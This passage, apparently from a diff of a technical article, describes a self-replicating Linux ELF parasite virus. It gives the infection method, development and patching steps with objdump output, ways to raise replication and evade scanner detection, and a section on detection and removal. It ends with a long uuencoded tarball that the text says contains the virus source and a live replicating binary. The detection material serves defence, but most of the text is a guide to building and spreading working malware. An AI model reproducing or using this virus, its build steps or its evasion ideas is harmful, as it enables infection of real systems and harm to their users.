+Directory searches are however very slow irrespectively, even without large
+tree walks.  If parasite code does not fork, its very quickly noticed what is
+happening.  In the sample virus supplied, only a small random set of files
+in the current directory are searched.
+
+Forking, as mentioned, easily solves the problem of slowing the startup to
+the host code, however new processes on the system can be spotted as abnormal
+if careful observation is used.
+
+The parasite code as mentioned, must be completely written in machine code,
+this does not however mean that development must be done like this.
+Development can easily be done in a high level language such as C and then
+compiled to asm to be used as parasite code.
+
+A bootstrap process can be used for initial infection of the virus into a host
+program that can then be distributed.  That is, the ELF infector code is used,
+with the virus as the parasite code to be inserted.
+
+THE LINUX PARASITE VIRUS
+
+This virus implements the ELF infection described by utilizing the padding at
+the end of the text segment.  In this padding, the virus in its entirety is
+copied, and the appropriate entry points patched.
+
+At the end of the parasite code, are the instructions.
+
+    movl    %ebp, $XXXX
+    jmp *%ebp
+
+XXXX is patched when the virus replicates to the host entry point.  This
+approach does have the side effect of trashing the ebp register which may or
+may not be destructive to programs who's entry points depend on ebp being set
+on entry.  In practice, I have not seen this happen (the implemented Linux
+virus uses the ebp approach), but extensive replicating has not been performed.
+
+On execution of an infected host, the virus will copy the parasite (virus)
+code contained in itself (the file) into memory.
+
+The virus will then scan randomly (random enough for this instance) through
+the current directory, looking for ELF files of type ET_EXEC or ET_DYN to
+infect.  It will infect up to Y_INFECT files, and scan up to N_INFECT files in
+total.
+
+If a file can be infected, ie, its of the correct ELF type, and the padding
+can sustain the virus, a a modified copy of the file incorporating the virus
+is made.  It then renames the copy to the file its infecting, and thus it
+is infected.
+
+Due to the rather large size of the virus in comparison to the page size
+(approx 2.3k) not all files are able to be infected, in fact only near half on
+average.
+
+DEVELOPMENT OF THE LINUX VIRUS
+
+The Linux virus was completely written in C, and strongly based around the
+ELF infector code.  The C code is supplied as elf-p-virus.c  The code requires
+the use of no libraries, and avoids libc by using a similar scheme to the
+_syscall declarations Linux employs modified not to use errno.
+
+Heap memory was used for dynamic allocation of the phdr and shdr tables using
+'brk'.
+
+Linux has some syscalls which require the address of initialized strings to
+be passed to it, notably, open, rename, and unlink.  This requires initialized
+data storage.  As stated before, rodata cannot be used, so this data was
+placed at the end of the code.  Making it relocatable required the use of the
+above mentioned algorithm of using call to push the address (return value)
+onto the stack.  To assist in the asm conversion, extra variables were
+declared so to leave room on the stack to store the addresses as in some
+cases the address was used more than once.
+
+The C code form of the virus allowed for a debugging version which produces
+verbose output, and allows argv[0] to be given as argv[1].  This is
+advantageous because you can setup a pseudo infected host which is non
+replicating.  Then run the virus making argv[0] the name of the pseudo infected
+host.  It would replicate the parasite from that host.  Thus it was possible to
+test without having a binary version of a replicating virus.
+
+The C code was converted to asm using the c compiler gcc, with the -S flag to
+produce assembler.  Modifications were made so that use of rodata for
+initialized data (strings for open, unlink, and rename), was replaced with
+the relocatable data using the call address methodology.
+
+Most of the registers were saved on virus startup and restored on exit
+(transference of control to host).
+
+The asm version of the virus, can be improved tremendously in regards to
+efficiency, which will in turn improve the expected life time and replication
+of the virus (a smaller virus can infect more objects, where previously the
+padding would dictate the larger virus couldn't infect it).  The asm virus was
+written with development time the primary concern and hence almost zero time
+was spent on hand optimization of the code gcc generated from the C version.
+In actual fact, less than 5 minutes were spent in asm editing - this is
+indicative that extensive asm specific skills are not required for a non
+optmised virus.
+
+The edited asm code was compiled (elf-p-virus-egg.c), and then using objdump
+with the -D flag, the addresses of the parasite start, the required offsets for
+patching were recorded.  The asm was then edited again using the new
+information.  The executable produced was then patched manually for any bytes
+needed. elf-text2egg was used to extract hex-codes for the complete length of
+the parasite code usable in a C program, ala the ELF infector code.  The ELF
+infector was then recompiled using the virus parasite.
+
+# objdump -D elf-p-virus-egg
+.
+.
+08048143 &lt;time&gt;:
+ 8048143:       55              pushl  %ebp
+.
+.
+08048793 &lt;main0&gt;:
+ 8048793:       55              pushl  %ebp
+.
+.
+ 80487f8:       6a 00           pushl  $0x0
+ 80487fa:       68 7e 00 00 00  pushl  $0x7e
+ 80487ff:       56              pushl  %esi
+ 8048800:       e8 2e fa ff ff  call   8048233 &lt;lseek&gt;
+.
+.
+ 80489ef:       bd 00 00 00 00  movl   $0x0,%ebp
+ 80489f4:       ff e5           jmp    *%ebp
+
+080489f6 &lt;dot_jump&gt;:
+ 80489f6:       e8 50 fe ff ff  call   804884b &lt;dot_call&gt;
+ 80489fb:       2e 00 e8        addb   %ch,%al
+
+080489fd &lt;tmp_jump&gt;:
+ 80489fd:       e8 52 f9 ff ff  call   8048354 &lt;tmp_call&gt;
+ 8048a02:       2e 76 69        jbe    8048a6e &lt;init+0x4e&gt;
+ 8048a05:       33 32           xorl   (%edx),%esi
+ 8048a07:       34 2e           xorb   $0x2e,%al
+ 8048a09:       74 6d           je     8048a78 &lt;init+0x58&gt;
+ 8048a0b:       70 00           jo     8048a0d &lt;tmp_jump+0x10&gt;
+
+0x8048143 specifies the start of the parasite (time).
+0x8048793 is the entry point (main0).
+0x80487fb is the lseek offset which is the offset in argv[0] to the parasite.
+0x80489f0 is the host entry point.
+0x8048a0d is the end of the parasite (not inclusive).
+
+0x8048a0d - 0x8048143 (2250)is the parasite length.
+0x8048793 - 0x8048143 (1616) is the entry point as a parasite offset.
+0x80487fb - 0x8048143 (1720) is the seek offset as a parasite offset.
+0x80489f0 - 0x8048143 (2221) is the host entry point as a parasite offset.
+
+# objdump --all-headers elf-p-virus-egg
+.
+.
+Program Header:
+    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
+         filesz 0x00015960 memsz 0x00015960 flags r-x
+.
+.
+
+The seek offset as a file offset is 0x80487fb - 0x08048000 + 0x00000000 (2043)
+(&lt;seek address from above&gt; - &lt;vaddr&gt; + &lt;off&gt;)
+
+To patch the initial seek offset, an infection must be manually performed,
+and the offset recorded.  The infected host is not functional in this form.
+
+# infect-elf-p host
+Parasite length: 2251, Host entry point index: 2221, Entry point offset: 1616
+Host entry point: 0x8048074
+Padding length: 3970
+New entry point: 0x80486ce
+Parasite file offset: 126
+Infection Done
+# vpatch elf-p-virus-egg 2043 126
+
+The supplied program elf-egg2text will convert the address range specified
+on the command line, and found using the ELF loadable segments in the file to
+a hex string for use in C.
+
+usage: elf-egg2text filename start stop
+
+# elf-egg2text elf-p-virus-egg 0x08048143 0x8048a0d &gt; parasite-v.c
+
+parasite-v.c was edited manually to declare the hex string as the variabled
+char parasite[], and likewise these variables were declared.
+
+long hentry = 2221;
+long entry = 1616;
+int plength = 2250;
+
+The infector was recompiled and thus can infect the host it was compiled for
+making it a live virus.  null-carrier is the supplied host program that the
+infector is compiled for.
+
+This completed the manual infection of the virus to a host.  The newly infected
+host would then attempt replication on execution.  A live virus has been
+included in the source package (live-virus-be-warned).  A simplified carrier
+program (carrier.S) was used to host the virus (null-carrier is the uninfected
+host as stated).
+
+IMPROVING THE LINUX VIRUS
+
+The first major change that would increase the life time and replication rates
+of the virus is to optimise the code to be space efficient.  Looking at a 50%
+size decrease is probably realistic when optimised.
+
+The replication is notable rather slow scanning only the current directory.
+The virus may be modified to do small tree walks increasing infection rates
+dramatically.
+
+The virus is easily detected - see below.
+
+VIRUS DETECTION
+
+The virus described is relatively easy to detect.  The blatant oddity is that
+the entry point of the program isn't in a normal section or not in a section at
+all.
+
+Typically the last section in the text segment is .rodata which obviously
+shouldn't be the entry point.  Likewise, it is suspicious if a program does
+not have a corresponding section then this arouses any would be virus scanner.
+Also if no section table at all, which will disguise what section the entry
+point is in, is certainly an odd event (even though this is optional).
+
+Removal of the virus described here, is similar to infection, requiring
+deletion of the virus code, modification of the ELF headers to reflect segment
+relocation in the file and patching of the entry point to jump to the proper
+code.
+
+Location of the correct entry point can be easily seen by disassembling the
+executable using objdump, matching the entry point of the infected file to
+the disassembled code, and tracing through the code to find where the parasite
+code returns flow back to the host.
+
+$ objdump --all-headers host        # a parasite infected host
+
+&gt;host:     file format elf32-i386
+&gt;host
+&gt;architecture: i386, flags 0x00000112:
+&gt;EXEC_P, HAS_SYMS, D_PAGED
+&gt;start address 0x08048522
+
+.
+.
+
+The entry point is thus seen as 0x08048522, the entry point of the suspected
+parasite code.
+
+$ disassemble --disassemble-all host
+
+&gt;host:     file format elf32-i386
+&gt;
+&gt;Disassembly of section .interp:
+&gt;
+&gt;080480d4 &lt;.interp&gt;:
+&gt; 80480d4:       2f              das
+&gt; 80480d5:       6c              insb   (%dx),%es:(%edi)
+
+.
+.
+
+&gt;Disassembly of section .text:
+&gt;
+&gt;08048400 &lt;_start&gt;:
+&gt; 8048400:       31 ed           xorl   %ebp,%ebp
+&gt; 8048402:       85 d2           testl  %edx,%edx
+&gt; 8048404:       74 07           je     804840d &lt;_start+0xd&gt;
+
+.
+.
+
+&gt;Disassembly of section .rodata:
+&gt;
+&gt;0804851c &lt;.rodata&gt;:
+&gt; 804851c:       48              decl   %eax
+&gt; 804851d:       6f              outsl  %ds:(%esi),(%dx)
+&gt; 804851e:       73 74           jae    8048594 &lt;_fini+0x94&gt;
+&gt; 8048520:       0a 00           orb    (%eax),%al
+&gt; 8048522:       b8 00 84 04 08  movl   $0x8048400,%eax
+&gt; 8048527:       ff e0           jmp    *%eax
+&gt;        ...
+&gt;Disassembly of section .data:
+
+.
+.
+
+Looking at the entry point code, which looks obviously to be parasite code
+since its residing in the .rodata section, we have.
+
+movl    $0x8048400,%eax
+jmp *%eax
+
+This code is easily seen to be jumping to _start, the original host code.
+
+# entry host 0x808400
+
+The parasite code is thus easily removed from program flow by patching the
+entry point to skip the parasite code.
+
+On occasion no section matches the parasite code and hence the entry point. 
+objdump will only disassemble sections so thus we cant see the parasite code as
+is.  However, gdb can be used to disassemble manually, and the same method of
+manually finding the host entry point can be used as above.
+
+Automated virus detection of these variety of UNIX virus is practical by
+detecting missing section headers and/or entry points to non permissible
+sections or segments.
+
+Typically, the default entry point is _start, however this can be changed in
+linking.  If a virus has been found in a file, and the host entry point is
+indeterminable for any reason, it may be beneficial to patch the entry point
+to _start.  This however is still guesswork and not totally reliable.
+
+Typical general virus detection algorithms are directly applicable in UNIX,
+including signature strings, code flagging, file integrity checking etc.
+
+EVADING VIRUS DETECTION IN ELF INFECTION
+
+The major problem in terms of evading detection with the parasite described,
+is that the entry point changes to a suspicious position.
+
+Ideally, the entry point of the program either wouldn't change or stay within
+expected sections.
+
+A possible method using the parasite described would be to find unused memory
+in normal entry point sections such as the .text section, and insert code to
+jump to the parasite code.  This would require only a small number of bytes,
+and such empty space is common, as can be noted by looking through disassembly
+of executables.
+
+Alternatively, one of the original ideas of where to insert the parasite code,
+thrown away,  by extending the text segment backwards may be possible.  The
+parasite code and entry point would belong in the .text section and thus
+seemingly be quite normal.
+
+CONCLUSION
+
+The algorithms and implementation presented gives a clear example and proof of
+concept that UNIX while not popular for, is actually a viable breeding ground
+for parasites and virus.
+
+-- cut
+begin 644 unix-viruses-src.tgz
+M'XL(`"A__S&lt;``^U]:XR&lt;UW78ZF&%,U!+I?&/-`F"3RN+GB%G5_/&gt;F5U1"46N
+M9")\:9&gt;B+'.9Z3R^V1UR=F8R,[M&lt;6F(L@V(;8LVZ*&K`+1JT0)$B19M?A6"W
+M@0(_TBHH7"=%$\"MT]8%G(*I#=0M@E:.%;/GG/N^W_WFL9Q=*?9\TG)F[N/&lt;
+M&lt;\\]Y]QSS[W?N5NMQL[&lt;=J.[U?-[&lt;[UN]9F9R3]&gt;-KF0RWDS'CY)ZY/_\/(+
+M"POPETWG/2^5SF33,UYN'W`)/%N]?KGK&gt;3/==KL_J-RP_+^DSY8]_F?+U_QZ
+MH^E/L(U4,IG/9D/'/YW,IL3XY_+I+(P_,`R,?W*".(0^/^;C?_*D=]Q;KU:C
+M)U\X&lt;^+%5?@Q=S[MS=7;FXW^7+U;WO3G.NU&J^]WO;EU[REO[I5RLQD]&gt;6;Y
+MQ+D73I]9A@J11JON5_MS?K,^U_'H7\90&lt;S6_LK7N;7?*_&gt;J&D&gt;&OKWMKT4A$
+M3VNU67%,\UO][@WZUO=W^FDLKA6=[U'EUE:S.5&lt;M=[L-OQN-`E:+H9CH.#A@
+M2R!ZZF)$_S5?C48^$CMY,N[!OT2IN&?F&gt;W-M[R._R&!0&PP`?0VKS3-%58;E
+M8H1]NBJ)'%%#[_!BI%/NEGN-O@_Y&gt;H8+4&A1O1N&lt;&gt;HOZ.+F`S9TZM?S\RR\:
+M8T2``LP@ZA(7,4X#\&gt;LWJLA&lt;`ZMS]A@`8-4$$(T^%:EV++ZQF!!+64E&9^&gt;,
+MD:?66+OKLME`:4%`SE2+$?YE?E7":;5[_5JS4?%D%E8R^9F0UY.\9F/;YPU5
+M_+GKY6[+KT&Q^6&lt;,K@\I5=W8;-=`YSJSH]6F7VXM1B/=39!\'%@IWO'H^ZV@
+MIL^^/H'YO^LWV]4RZ/OYZJ3:&#S_IQ?RJ07+_LOFT\GI_'\0SU.-5K6Y5?.]
+M9T$G-=KS&\]%C2104V8:,`PD6^5N])Y!?1A,[=_H^#T;:+?16C?3ZM56OVDF
+M@3HS$];]?KM#342?JH&)VO*]LR=&gt;/'VRM'SNXLJKD&gt;1."IXT/-$HU\U@MGA^
+MM]ON@E637-)3NULMEE;=@,%OM!K]*LPOEZ]`8C0RN[:36YB-1"+/'(UTMGH;
+M3&lt;][VJ\U(I&CS[#,O)W9TS*3=F9Y1V5F[,R*EIFR,ZM:9CJ`D,K,%]9V,AGV
+MET[CWZQ6]"/)':1*!AY1H5);VTDF];]9SX,:F^WM)I9/)A"UCFR@7E_;\7.S
+MGO$\&lt;]2+;':\H[+D$A*^NU7M&gt;R68;+::OO=:-++&lt;K&?2I&gt;6-6C?BPS]+(F45
+M?AR-]%C25JO76(&gt;9R&NV6^N1S7*-4F&@(I&FWQ)?`7B_7&G4=B`!Q^WH44B#
+MF:_1AB(WH74.^&lt;:F=Q1U6+/4N[%9`D:IQ62KF`&gt;I`"=!C-!*&gt;,0"1QEP^-5N
+M]?H\K076;S0&gt;?8W:]QK00J0.S!1K$.]X#&gt;]9KP4?QX[%L:&gt;11MV+/0EPJIN=
+MV!$&[S)KZW+CRGRO7T)X5Q(&gt;?L3C4"'2]?M;W99W1):"GMV$5GCZN9?/G(&&gt;
+M!3L&-HCJFT7SH^PSV!/JB-Y9Z`4K._&lt;&lt;)^-E^5N0^LK2@,Z+TCBP\WZIM]':
+MVM3HH08:6L1_CWM'9`/PF_K+Z8:_,;6$"L,[?MQ;_=C%TNJK9R^&gt;&gt;)X!LP:0
+M*D;@"P`-C#4\,:UXW.YEXTJ""LE&&gt;XU/^L_@/^VZJACGA1ACT'=B"/B,+^&_
+MA#&lt;T\.1Q&JFXQX&gt;-T(O`0#K'&lt;KO=J,&H^-5K?,1"!Q#I7J_1L"DI\H[Z%BF9
+M6$4)G:Y?KL7JM82'B0F/=XFJQ..(J)6"E.V0BHS-8MU9ZIF_T^C'4G'&C"#F
+MRV=&gt;8!CW/!!SUA(@W4)&]XF&?JE1@\5,`HN"4DYXJ^P+;Z+&gt;`97?KT.E&C26
+M\&9?:$!'6^T^EE]K.5JE-@1LX@E`?OEB:67Y3`A(1)(*$E@J.1SR9KFZ@1,)
+M`C];RA3RWI$CGCLS6\@/:%F451@P&lt;"`QK.YP7+;];@^XDYJ[5#KY\LH*3&P#
+MFA3EL;7J5K&lt;+]'&lt;U(EBNV2[72EP"8DP-'.T()H.!LX25J3U`K]GS_6O$4U)&lt;
+MVO5ZS^_C("__4FEU&9!\UDN:S$2U7#T^V@'&gt;Y&gt;W'-T&1M:LQ0PZQ(+:+!85@
+MZ9!9G3!B2@'`OIEPB?W-E.'L;U!O[_)J3'N,P$M"&1_E@]+AJK8GISRF=0U=
+M(=J"=C#/K0LB",*3PJY:CA\5S,9T-4#0%3*.C(ZF'!\`)X;%+#_&gt;`%EZ6#&"
+M:HEA+%)-=`,H"##CLXEB:M4"&lt;/6&gt;6%K80P;[Z61*T)`R_J,OKT4]Z[&9T,Z7
+M#8J$FV(ZQOD39V1HA+-1&lt;%IGDJ"G,S:)X"1N&lt;00D'CNF@!T[%HTP,O2N-]"%
+M9L[4+*M:[ODT8&gt;,P+!H)YR\N6PG/G[ZXBDF1"G3V&LWC,G?UX@I,^)1KJ"N!
+M3&lt;(3&gt;DC-P`VDJ^H$SDNU';*N(@%K!DC06`IKFXP-`]D+*^=?%.C*1)A71D=0
+MM0,KEO)6LT]5A3KG]@7I=/H^&gt;Z[M;91;M:;?]7!T!8?'B-:+WM,-T/"6[8)9
+MRB91G$F\'CEVC(^U4F5B@1^JQY@*6/&;WE$H&S(U!.QI37DXC2Z)&lt;+/1NG9E
+MR8:`6HR;P3"Y8?LX(B!0S;GGNJ5&J]Z.JTHG8('@\56"CAVLY-&gt;=EJ9L'`%9
+M&lt;&HP?Q[W/%&7BB%L[YC'6V?SG5D+#7'59984QQ$-[3&lt;U;0.-TK@I(]W`/-0H
+MQV4%_F8K"F'\,;JM7BP]?_K&lt;J9@H0J1#&5F]^'SIS/F3)X2B9#PXN[RR&lt;GYE
+MT5O&gt;Z?O=5KF)UFNEW01&gt;ZR&OL&lt;4*LA.S8X/JE$AUW!/-;9&gt;;6S[TTB0_SP0=
+M`]C/&lt;P(#WD\UZB`8'KF/HQ*E54+!BSW=6WRZN1/W&CUFXTN$$E[,6#+&$1P@
+M])3?JC7JG!S&@+J6%;)'[M)/'C&gt;4@&F)14W)G45I04-,E$;#C[7#A!=E-RZ$
+M-]!6E(NO25FA&lt;84\7'SUPK(A$(02*:85-#9!N9XC;2NUCI9WX&lt;S%3'K13#I)
+M*1%BY;GC*`A+$3#WZ?&gt;QXR1@WAPF1\CLUZIJ%7G!);U=3=DY".;9:FZ%:213
+MTS%2A?;=13);PPTVV`8O[(&gt;L;6U3B%;X)IO)I0HU&lt;G5)+6*%:NTH!4))CH4J
+M6^&gt;*F3X2N&lt;K&lt;5NSKLYX#A&gt;!:%F#'&gt;16&lt;SB-\0D&gt;1YC,!_&gt;*:BTTOF-?A7^U%
+M.Z7&&68PP6!)`G]3+'IOXL94WUOW^[@J1^X8R4G!-(]C=L&FM*6^X?T0@'AE
+M+LU46C&lt;+`RLH8,&&gt;5#,DF1H(Z!499(;&gt;TQ;SEO890=&lt;A3%-'*F&lt;`H;972@F=
+M";K22^Z`NM2ZDC"&P*)47"&`_L]ABQNCQQY!U`7(=.%Y;/V1U!&lt;8FWRBX-Z]
+MB4I&lt;0%4#L?J-%A)9GY%5+8X+HGE,8$2^1E1G(4)E+6)8%VFMID;A+*,:I*[W
+M-X2]YFE5D+NB$5M!&lt;86D1J36!BW7\[O]F#`.\$@&F_K$BGW0,O3ZAM_E7RN]
+M7@FJ,C\FKX.&gt;&lt;/I'VAZU&lt;K_,%YU]@-U(T-ZC&$/1/893`P:8;:L#%&;&0$^A
+M,6^CW&gt;M3CZG]N#!,ZM@4+8N.X#?'VHI*N!9KHF6$["$-:%$K*4N;#BALS'$`
+M,P_TP^%@,(L14JSD@RP=DWOS@!CK1,3"ZD805(AG+M*O05?;';\5F]V&gt;[V]V
+M@"#G2Z^LG#]WYE7O=?AZ&lt;F7YQ$7ZMOSQDV=4,\`ID@P`(]`&gt;@@S#_'JW`1-&
+M7Z+.1CH(@\H-&%%(GZVV.S&lt;D,\7`0#(8BEM+FO`D/$;\OD;\DR^OQ*-L-K(5
+M"N=\ID,`DD+]"#)WPDM1M:,QY/JC\2-R&RB5QHT@E^X$WF@PTDB)AP2/G2FA
+M&lt;S*DA9D2'@!`BH;"2;0NO;8B(3XZ=2,'IE5M!P7""22*AW4R-%L\?=UOHESU
+M8?HX%!ZM=D:MY/+&B"=`[;""`?&gt;,&gt;&X:#IN@_,#LPU6UK@+`Z!Y;K)A6P1E"
+M*0,Q9SA5"F:$^SOKC1T^L92(N0&lt;Z/:F$L@82:.P&gt;X/Q.#3'#V!M@%$,FTP/,
+MO2RD/LAQEZ]&gt;P8E!VUP6!O.P2HP22]RX%NOEB,D%UL);TQVT@JRWMUHU[LB7
+M(Z/9!&gt;5^OUS=X!,&lt;3HMB!U,&lt;Z;(=T.'^9Y9T@9(ZNDN:J?:C/&lt;TJ@%$5;O_-
+M]K;/7([D0-U&!9&gt;0VE8:&8)5V`=QA)RO!*XX8:V&lt;P@E+S$?U,&gt;8CW2E_Q/*,
+M5YOMGA^C'UJ[C%[8YBLK&gt;V@1%L&lt;X%WO]#9_(JK;#Y(1^Q-AYX]MLH\[H`!^Z
+MT:C?H!:8C=5KPP^8%QM][UJK?;U'6=5VMPNL!]CH[$/8&!:3,3'Q:8G+'Q/:
+M)6J4#!ZP1[U-?[,-%5"BD"&\?KG2]/FN7XAIQ3&lt;4.W)[`6!W='?]'@PMG&lt;X(
+M^*/:QJ/INJ?&]NJY=YIBX?T9W3#K&)LI3,#B3)B"&gt;E%OP]*''7(2=:02O'"Q
+M=.K5&lt;R?.GCXI/`MVH&gt;-4Z,SY$Z=P)U-D,&lt;G%.D#9!K)0@_$1C4W/7]\$;O!^
+M`8F,JDNPT`NHBB0\7FQ^?EYL,T8BNB,[,MLID2Y8C'`32":S]A&lt;C9-3)5)R&gt;
+M&gt;I^T4X$%[43I](Z(#C&=8Z9Q]60FLC:L1&K"\&)PH_.X13&8GDU`K-=&lt;U6G%
+M"2),VZ[2^NK:&lt;*@D/*,[WC$'EB+1M@D%]O@1F*LE?$O4L;"&gt;I'6`8V!VB/&gt;6
+M&gt;?6D@X?&lt;(QVQJZ"KCYK0'\"67?]7MAI=2.JWO7*UV@:44,$@T_5LS=(;K%IZ
+MNBCV)JA:&gt;L-4R]XW!4W5TC-UBZ-#XTP16QV#E-`#H''7KS=Q1L!4ODQOMV#*
+MUF821FO7/F]OB&YRV6K6:0#ON&gt;.&gt;4C/Z!I40)6&3SS.OB\W1D*1,B,#FU&lt;0'
+M".BH$7"C#"9-!2933EP&lt;LS9;MR!Q:XW&gt;-&lt;4FS(2?\+A&ZC"7QP@@FY2C$6V&lt;
+M.\YQ]G?Z(,?:../;"%*=Q_KM:`3%X#H??\D6\2BS%`YRED*C49C1MI*U.$-C
+M@\A-SX&lt;1]"8_SQF(,'5M(^+6O!:"MKH&gt;%X0QX3)8?%X4/BX327/BY378G&E7
+MH%1&lt;E$:9=Y^L]E2X)K=TBYOG!NF6_3#/E+!-T#XC65.B)GI-)KW6WY9_G&gt;LT
+MK8.ZYM&5GI$&gt;9(.!;*3![83`[&gt;P!+G:-^K11[EG:C:LV5"+-NK&lt;!=/*[KD%\
+M`!^G&KG1UD1AK@T496(ZF]V4DYPMZZ@I8?J(Q2HG!EM#XR()'7"TC"]WUZMB
+M[0S?MR]?D6?&gt;,`LU629D\VBK5U[W%V&9U":7MWJ;JNT^YJ&gt;6[=10ZDK"HR_I
+M*^P4%Q9.$HH'?OX_\/X'BL4&lt;&gt;Z4(I'PB+X$,?O\CE4OETOS]CWPNF\7W/W*Y
+M5&;Z_L=!/(/?_]B']SI&lt;[X_P=SWD&gt;QT73KRX7%H]_8GE2#99S#.YQ&lt;V"$@A:
+MOU%NQL0&gt;&'ZV:]KN)":@N,NS[@WDY\L2()[],0KS?4KR&lt;=&VY/4-W&6*H2$B
+M:X&RX@?W(J9AWV"3DBQ(KF?MUVLTVP:G([&1/)&gt;2QJY2F6TG8*DO70K3`8^V
+M,F5]KHC0WK.1QYEDSI,'/+N#IE&]&5//:TAW!RMW&P;_G32\G,`1)7;D/&:?
+MI&lt;6Q%?[4,4^BV^[Y$&lt;ZE#W7U6R=`'6?6ES^^?'*DUNTC[%B13I"30?U@^(Q_
+MTGTD=$&lt;\][Y7K$//Q(^$7.@)^1'046&lt;C&lt;"9$?HS9&_'L]W9"*!UM,T2L1![&lt;
+M%=]Q^.*%`Y[_1-&KU_@/YH[G/[CQD\`36NI4N3"-.NT&gt;V$EDL/*&lt;#A4V#Z`S
+M/-1I`,&lt;9`MW#KLCS`)[]_?:S1TP-0[#X4N#`_&gt;]J4VG[LLX[M)VD%1W#4]]Q
+M^],ZQEL!`SSVG;\L+GLN'!UQO+XC9^G!#.!V?70&gt;U/?QP$X)\SCL&(YXW0_O
+M=L,[O?!.)[S+!Z]&lt;\`X/O,L![_*_!]SOZL3NN"[XL;S8Y/\8W6&lt;?U7W&gt;!^GN
+M-L4SW.O=VS&gt;W-YL,E.*9M/_;?@UFW[W=;-Z3)_TTK]O[Z0&gt;7LW'0S;TWOZ^A
+M2?;F]WU@Y;&lt;WQZ\BQ8&[&gt;K6F@TY&lt;D1E0R?OLJ^7ZT!O-8[M/KDME+8[AEY04
+MT^WXL).?M@$&gt;.`&lt;ZRH(!&gt;J_&lt;F-AA3?#;$S@:V1[S:.0&gt;O*;K;1@SBKZSU7$N
+MJ&lt;=VG08AZN.A`!NFTY!1"3W_9C:FAD:NRM#/WA&.=AT112M8A:A9CSJ($S@M
+M1`(T#$-04G14!!F9#9&lt;2S7\UX3A&NZ#=XPV;4(8&lt;-/6TP=./F9KDWTYX8C(,
+MS(4#1W,`XDQ^YZ2$NG!W,X,Q/^\K,_1&80;&gt;DV.$T+ZR@8Z%DZC6L&lt;Q0GM`!
+M#3V&&8:_.I1IEQCF+ZE7-]K76S$=XZV&]F.]41O:.H$8^&gt;5C&lt;;PQRFFPB'Y5
+M?+53]-L^OSC2WHOE/P%&gt;R&2$"V(;P_-$(Z'A&gt;&gt;CP4EAX'IGI"L\C,UWA&gt;62F
+M*SR/S'2%YV&F!^3ZE;6=5'T6"WA7-SO&gt;9F^]!)\4-`==#O"SBO$+/0FNR,`!
+MOW6:6B`@BMU36-M)9HW8/1'R6V#HGFS"[%$%6DZF0@JG$F8/*V4HX(&lt;5SB9$
+MIZAPM;:V4TBR/N&P?20)/R.JS[FRH`AV05'$Z)_*U&E9L3/U42C8F?KX^7:F
+M/O+U`$*4&6!W=WPD10D9'HD5!Q`."#QBDASRHZJ"J,5''G+5P/LPN+4JJ\[^
+MJ&'D#LDFO$&gt;GS[VP?/+B\BGO8^REFVA$S#)B]S(]&gt;/&gt;2APVD_3YA+PM5%1*M
+M1/E"Y3[FMC1.MN,)T_GY?F]M3I\1'O?^;Z]:;K4F%@)P2/S?;#J?M_=_4[EI
+M_-\#&gt;282_R\\?-]T0V^ZH?&gt;!V=`;Q00-[-8)"(X=.G$*@68]&gt;FD6VX6EX+8O
+M-LOTMVO'FIV?[M%D3$XB0B]Y)3@C2V));X&gt;&lt;E[7=-WT&lt;U":&lt;33+;PS'N"(^T
+M,Q?6Z%AQCT(V[U3XD'Z9O:2,L]C\_+S'UB)\KV!O&gt;VJB_3V\!*,3R?;&lt;A]%#
+M^?%'H4C(WIO&gt;\,A;&lt;&$8A:ZM1^:+D&lt;]O3H))9-T!9YQ%F9$\WG:C^_+F#2J4
+M;1Z;P-C38KM2])(MO&lt;1!O/S&lt;&lt;5[XR!$M]5DOYMP&HU=&I"/&gt;&gt;&]GK:7&gt;M5E]
+M&gt;?7"Z9.GS[^\ZM&KC]Z%\Z?/7?1$]NESWJD3%T\`W[QX%O+G9P,@Q"LUABID
+M/NS!KY)$-!$&U;6LOP.I@#%GPOMM-?WH/`'['V&gt;=`SW_Z6%L8MO^SR[DIO;_
+M03QCV__N,Z$#5P7:N&lt;Z5$ZNG+RZ7SBR?&gt;_'BQR*17#:?EKD7SUXHX:4#YTZ&lt;
+M70:5@@=HYLL=,$=J8!'-6EMQGJA5:_BQC\&lt;CKWE&lt;=WQ\EA2'G!5@-G@*-Q;M
+M&J*`#!HVQ#H4O_S6=D=S5Y*C&gt;*OO/!&lt;5C*UBA8L1]&"J3C]&Q4V^\%-4V(E9
+M=N*J%I^5N&lt;[]-BJK0JSP&lt;P:F9]L:FB7YOB\W&lt;;00H*810\"U&lt;P&gt;FM6&!U0T.
+M.BEKY.(41&gt;!$?=4QRXHP]DZH"B^`-2+FV]\P.H*J.H&gt;)U\"M[&lt;"+*R^?.QFR
+M'PB`+-I#DL*1[Z=L]&lt;.QE$58+?T]%(XSYJEMYY=7ETLOG%_Y)3%H8*I&lt;BTDJ
+M0Y(VOI`UJV?!"/%M0CZ%^M5MWR(!LAFN7[8[&lt;7XRBCI2;O0[C5J,=E]PE!,(
+MR&gt;P(*T(-&lt;K^_#EE.W$G:TT;Q&QD++H]3A^&!/.[YG]^A,Z$VAKS_D&lt;JG[/&lt;_
+ML@NIZ?T?!_+@@:-J&gt;[.#?K+KC?Z&-W=**9VNWVF6J^R`A:6K66',8,'.Q%$D
+M#JOFX=MH,*6M-IK;C;9WTN^5NSY,4+#6PF**[7#.;&gt;)JO0D6!#NA=!`VB4KJ
+M-S9],Z760,_2D.M(PMZ"@614CH/MG@6\IB3$[IG?;J32V5EG=EKD9V8UX*_B
+MJK-TXM*+8%"9=Z/`2@OO4LSE9?*K;-\(,K(R[9Q,2^6U^A^'R?#T\FHDDDFJ
+MU-/G3IU&gt;.7O^%*2RTVJGO=Y&&gt;ZM9\RH8Z@7&N`H#7=]J&gt;N4*3I@4R`B6U:&lt;:
+M?@**5,M;&gt;,:K_]%FT^M5N_YU;ZN##!&-D+G'AW]?[3SM&IC-\GH#H_@2K?A;
+MU]6.?)T/7_##L*=]]I;?&lt;\^I!%93I&QNRW&lt;!T;IKXK'Q&lt;JO1OR&N34"V9U5B
+M+3RDI198C./IK#TE!=XRP*R-FGS;`$5&,SY'M#O[U/B2P[WI/FL?&lt;.!LA#GV
+MGCQN)?#7&gt;5)+KJLC=+A!/P[SNY"['VQ?\A&3JS_IO?[ZX-(IK71J:.FT5CH]
+MM'1&*YV118V.ZMWB=:WM`N&&lt;-W-.O7I.A^,`$^KE#^21DW\@K!#?N]8/;0VQ
+M8:TA5"GAAF)&.CIS-H('93A/$-O%E=4?11?4DX'%AU$Z&HFKM\12NOU/.#%6
